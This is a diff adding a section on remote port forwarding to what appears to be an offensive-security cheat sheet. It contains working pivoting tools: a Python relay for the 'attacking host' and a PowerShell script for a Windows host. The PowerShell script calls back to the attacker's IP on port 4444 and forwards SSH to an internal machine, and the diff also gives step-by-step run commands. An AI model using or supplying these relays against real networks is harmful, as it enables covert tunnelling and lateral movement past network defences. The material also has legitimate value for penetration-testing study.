@@ -768,7 +768,9 @@ Remove port forwarding rule.
 
 `netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0`
 
-## >> TCP port forwarding with powershell
+## >> TCP local port forwarding with powershell
+
+Local port forwarder using a bind socket.  Example listens on port 2222 and forwards to remote host 192.168.1.19 port 22.
 
 ```powershell
 # Target parameters
@@ -862,6 +864,147 @@ while($true) {
    }
 }
 ```
+
+## >> TCP remote port forwarding with powershell
+
+Remote port forwarder on attacking host relays through Windows host running a powershell port forwarder.  Example attacking Linux host runs a python script that proxies a local application through a connection received from the Windows host.  The Windows host then forwards the traffic to another remote host.  This example shows how to run a python script on attacking host 192.168.1.19 that forwards SSH to port 2222 through a connection initiated from a Windows host to the attacking machine on tunnel port 4444.  The Windows host then forwards the SSH traffic to remote host 192.168.100.109 port 22.
+
+Python script `apprelay.py`<br />
+```python
+#!/usr/bin/python
+
+import socket
+import sys
+import struct
+from time import sleep
+import select as socksel
+
+t_port = 4444
+a_port = 2222
+t_host = '0.0.0.0'
+a_host = 'localhost'
+
+t_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+t_addr = (t_host, t_port)
+a_addr = (a_host, a_port)
+
+t_socket.bind(t_addr)
+a_socket.bind(a_addr)
+
+t_socket.listen(1)
+t_conn, t_caddr = t_socket.accept()
+print("Tunnel connection received from {}".format(t_caddr))
+print "Start your local application and connect to " + a_host + " on port " + str(a_port)
+
+a_socket.listen(1)
+a_conn, a_caddr = a_socket.accept()
+print "Application connection received"
+
+t_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+a_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+
+while True:
+   sock_list = [t_conn, a_conn]
+   read_sock, write_sock, error_sock = socksel.select(sock_list , sock_list, sock_list)
+   t = 0
+   for sock in read_sock:
+       if(sock == t_conn):
+         t += 1
+         data = sock.recv(4096)
+         if data:
+            a_conn.send(data)
+         else:
+            sys.exit()
+       if(sock == a_conn):
+         t += 1
+         data = sock.recv(4096)
+         if data:
+            t_conn.send(data)
+         else:
+            sys.exit()
+   if(t == 0):
+      sleep(0.01)
+```
+
+Powershell script `tcprelay.ps1`<br />
+```powershell
+# Target parameters
+$tcpTHost = "192.168.100.109"
+$tcpTPort = "22"
+
+# Attacker parameters
+$tcpAHost = "192.168.1.19"
+$tcpAPort = "4444"
+
+try {
+   $tcpAClient = New-Object System.Net.Sockets.TcpClient($tcpAHost, $tcpAPort)
+}
+catch {
+   Write-Output "Failed to connect to attacking host"
+   exit
+}
+
+try {
+   $tcpTClient = New-Object System.Net.Sockets.TcpClient($tcpTHost, $tcpTPort)
+}
+catch {
+   Write-Output "Failed to connect to target host"
+   exit
+}
+
+$TStream = $tcpTClient.GetStream()
+$AStream = $tcpAClient.GetStream()
+
+$TBuffer = New-Object Byte[] $tcpTClient.ReceiveBufferSize
+$ABuffer = New-Object Byte[] $tcpAClient.ReceiveBufferSize
+
+$idle = 0
+
+while($true) {
+   if($tcpTClient.Connected -and $tcpAClient.Connected)
+   {
+      if(($tcpTClient.Client.Available -gt 0) -or ($tcpAClient.Client.Available -gt 0))
+      {
+         if($tcpTClient.Client.Available -gt 0)
+         {
+            $TRead = $TStream.Read($TBuffer, 0, $TBuffer.Length)
+            $AStream.Write($TBuffer, 0, $TRead)
+            $idle = 0
+         }
+         if($tcpAClient.Client.Available -gt 0)
+         {
+            $ARead = $AStream.Read($ABuffer, 0, $ABuffer.Length)
+            $TStream.Write($ABuffer, 0, $ARead)
+            $idle = 0
+         }
+      }
+      else
+      {
+         Start-Sleep -Milliseconds 10
+         $idle++
+         if($idle -gt 3000)
+         {
+            # approx 30 sec idle close
+            $tcpTClient.Close()
+            $tcpAClient.Close()
+         }
+      }
+   }
+   else
+   {
+      Write-Output "Connection closed"
+      exit
+   }
+}
+```
+
+Start `apprelay.py` on the attacking machine.
+
+Execute `powershell -File tcprelay.ps1` on the Windows host.
+
+When `apprelay.py` indicates that you can start your local application execute `ssh user@localhost -p 2222`.
 
 ## >> Downloading files with compiled Javascript
 
